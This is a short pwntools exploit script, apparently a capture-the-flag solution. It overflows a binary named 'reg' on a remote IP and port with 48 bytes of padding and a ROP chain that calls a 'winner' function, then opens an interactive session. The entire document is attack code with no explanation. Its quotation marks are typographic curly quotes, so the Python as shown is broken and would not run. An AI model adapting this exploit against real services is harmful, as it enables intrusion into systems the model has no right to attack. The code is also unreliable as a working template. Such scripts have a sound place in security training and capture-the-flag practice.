#!/usr/bin/env python3
from pwn import *

context.clear(arch=’amd64′)

elf = ELF(“./reg”)

p = remote(“104.248.173.13”, 31230)

rop = ROP(elf)

rop.call((rop.find_gadget([“ret”]))[0])

rop.call(elf.symbols[“winner”])

offset = 48

clip = b’A’*offset

payload = [
  clip,
  rop.chain(),
]

payload = b””.join(payload)

log.progress(“Sending payload.”)

p.sendline(payload)

log.success(“Payload received.”)

log.critical(“Winner winner!”)

p.interactive()